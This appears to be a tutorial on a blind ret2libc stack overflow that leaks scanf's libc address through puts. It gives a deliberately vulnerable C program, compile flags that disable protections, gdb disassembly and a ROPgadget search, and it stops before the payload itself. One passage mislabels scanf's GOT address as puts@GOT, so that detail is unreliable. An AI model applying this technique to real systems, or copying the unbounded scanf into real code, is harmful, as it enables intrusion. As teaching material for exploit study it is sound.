# EXPLOITS
## STACK BUFFER OVERFLOW FOR BLIND RETURN TO LIBC (bRet2libc) by leak of libc
## REQUIRED TO UNDERSTAND : STACK BUFFER OVERFLOW FOR RETURN TO LIBC (ret2libc) and STACK BUFFER OVERFLOW FOR RETURN ORIENTED PROGRAMMING (ROP)
## Can't work if : 
```
> PIE is enabled
```
## Bypasses protection :
```
> NX (non executable) because we're not executing any shellcode
> ASLR (address space layout randomization) because we will leak the address
```
Okay, to figure out what brought us here, you should have understand how return oriented programming and normal ret2libc attack works  
So actually, this attack is a normal ret2libc attack but without knowing the address of the target libc function we wanna execute, actually, the goal is to guess it then do a ret2libc  
Okay so here are the steps :
  1. Leak the address of `scanf()` using `puts()` by getting the real address of `scanf()` using it's GOT (Global Offset Table) address using `puts()` from PLT (Procedure Linkage Table)
  2. Once we have the real `scanf()` address from libc, we can calculate the address of `system()` using the offset that separates `scanf()` and `system()` in libc
  3. We can do a normal ret2libc using the address of `system()` calculate before

Okay let's look a simple example source code :
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>

void vuln()
{
  char buffer[64];
  printf("Enter a string : \n");
  scanf("%s",buffer);
}
int main(int argc, char **argv)
{
  vuln();
}
```
Simple, the `printf()` we have before `scanf()` will be used to get the GOT address of `printf()` but actually, for optimisation reasons, the compiler will replace `print()` with `puts()`  
So let's compile it :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -m32 -no-pie
```
Okay now let's look at the assembler code using gdb :
```
gdb <executable>
# (GDB)>
disass vuln
```
```asm
Dump of assembler code for function vuln:
   0x080491b6 <+0>:	endbr32 
   0x080491ba <+4>:	push   ebp
   0x080491bb <+5>:	mov    ebp,esp
   0x080491bd <+7>:	push   ebx
   0x080491be <+8>:	sub    esp,0x44
   0x080491c1 <+11>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491c6 <+16>:	add    ebx,0x2e3a
   0x080491cc <+22>:	sub    esp,0xc
   0x080491cf <+25>:	lea    eax,[ebx-0x1ff8]
   0x080491d5 <+31>:	push   eax
   0x080491d6 <+32>:	call   0x8049070 <puts@plt>
   0x080491db <+37>:	add    esp,0x10
   0x080491de <+40>:	sub    esp,0x8
   0x080491e1 <+43>:	lea    eax,[ebp-0x48]
   0x080491e4 <+46>:	push   eax
   0x080491e5 <+47>:	lea    eax,[ebx-0x1fe6]
   0x080491eb <+53>:	push   eax
   0x080491ec <+54>:	call   0x8049090 <__isoc99_scanf@plt>
   0x080491f1 <+59>:	add    esp,0x10
   0x080491f4 <+62>:	nop
   0x080491f5 <+63>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080491f8 <+66>:	leave  
   0x080491f9 <+67>:	ret    
End of assembler dump.
```
We can see a call to `puts()` from PLT which prints "Enter a string : \n" then a call to `scanf()` from PLT  
To build our exploit we need 4 informations :   
* Address of `scanf()` in GOT
* Address of `puts()` in PLT 
* The `main()` function address
* And the address of a gadget : `pop ebx`
With this line we have informations about `puts()` we need :
```
0x080491d6 <+32>:	call   0x8049070 <puts@plt>
```
So we have the address of `puts()` in PLT which is `0x8049070` here (1/4)  
And here the PLT of `scanf()` :
```
0x080491ec <+54>:	call   0x8049090 <__isoc99_scanf@plt>
```
To find the address of `scanf()` we need to disassemble the function itself :
```
disass 0x8049090
```
```
Dump of assembler code for function __isoc99_scanf@plt:
   0x08049090 <+0>:	endbr32 
   0x08049094 <+4>:	jmp    DWORD PTR ds:0x804c014 <------ ADDRESS OF PUTS@GOT
   0x0804909a <+10>:	nop    WORD PTR [eax+eax*1+0x0]
End of assembler dump.
```
So we now that `0x804c014` is the address of `puts()` in the GOT (2/4)  
Next we need the `main()` function address :
```
x main
```
```
0x80491fa <main>:	0xfb1e0ff3
```
`0x80491fa` is the address of the `main()` function (3/4)  
Finally, we just need a gagdet that pops ebx which is ...surprise... `pop ebx` !  
To get it we can use ROPgadget :
```
ROPgadget --binary <executable> | grep "pop ebx"
```
```
0x08049022 : pop ebx ; ret
```
`pop ebx` : `0x08049022` (4/4)
